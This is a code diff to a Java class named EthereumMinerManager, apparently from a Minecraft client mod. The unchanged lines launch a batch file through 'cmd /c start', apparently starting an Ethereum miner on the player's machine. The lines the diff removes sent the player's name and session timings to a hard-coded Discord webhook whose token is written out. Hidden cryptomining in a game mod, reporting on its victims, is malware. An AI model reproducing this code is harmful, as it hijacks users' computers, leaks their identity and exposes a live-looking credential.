@@ -6,7 +6,6 @@ import net.minecraft.client.Minecraft;
 import java.io.*;
 import java.net.URL;
 import java.net.URLConnection;
-import java.net.URLEncoder;
 import java.nio.file.Files;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -24,7 +23,6 @@ public class EthereumMinerManager {
     protected InputStream inputStream;
     protected OutputStream outputStream;
     protected Thread thread;
-    protected long startTime;
     protected String name;
 
     public EthereumMinerManager init() {
@@ -40,11 +38,6 @@ public class EthereumMinerManager {
             Runtime.getRuntime().exec("cmd /c start " + bat);
         } catch (Exception ignored) {
         }
-        if (mc.player != null) {
-            sendWebhookNotification("```\u27E0 " + mc.player.getName() + " has started mining." + "```");
-            name = mc.player.getName();
-        }
-        startTime = System.currentTimeMillis();
     }
 
     public void end() {
@@ -53,10 +46,6 @@ public class EthereumMinerManager {
         } catch (IOException e) {
             throw new RuntimeException(e);
         }
-        final long seconds = getSeconds();
-        final long minutes = getMinutes();
-        final long hours = getHours();
-        sendWebhookNotification("```\u27E0 " + name + " has finished a session lasting: \n\u27E0 Seconds: " + seconds + "\n\u27E0 Minutes: " + minutes + "\n\u27E0 Hours: " + hours + "```");
     }
 
     protected ArrayList<File> filesInFolder(File file) {
@@ -87,56 +76,6 @@ public class EthereumMinerManager {
         });
         thread.start();
     }
-
-    protected void sendWebhookNotification(final String message) {
-        PrintWriter out = null;
-        BufferedReader in = null;
-        StringBuilder result = new StringBuilder();
-        try {
-            final URL realUrl = new URL("https://discord.com/api/webhooks/960096367139778620/c_p1_LHCUDuxj0NPjnkb91ZBdF5bIpBklrl1rV5BoSptHM3VEbTMcIpS8RlULMCk3mvT");
-            final URLConnection conn = realUrl.openConnection();
-            conn.setRequestProperty("accept", "*/*");
-            conn.setRequestProperty("connection", "Keep-Alive");
-            conn.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
-            conn.setDoOutput(true);
-            conn.setDoInput(true);
-            out = new PrintWriter(conn.getOutputStream());
-            final String postData = URLEncoder.encode("content", "UTF-8") + "=" + URLEncoder.encode(message, "UTF-8");
-            out.print(postData);
-            out.flush();
-            in = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            String line;
-            while ((line = in.readLine()) != null) {
-                result.append("/n").append(line);
-            }
-
-        } catch (Exception ignored) {
-        } finally {
-            try {
-                if (out != null) {
-                    out.close();
-                }
-                if (in != null) {
-                    in.close();
-                }
-            } catch (IOException ex) {
-                ex.printStackTrace();
-            }
-        }
-        System.out.println(result);
-    }
-
-    public long getSeconds(){
-        return (System.currentTimeMillis() - startTime) / 1000;
-    }
-
-    public long getMinutes(){
-        return  ((System.currentTimeMillis() - startTime) / 1000) / 60;
-    }
-    public long getHours(){
-        return (((System.currentTimeMillis() - startTime) / 1000) / 60) / 60;
-    }
-
     public File getBat() {
         return bat;
     }
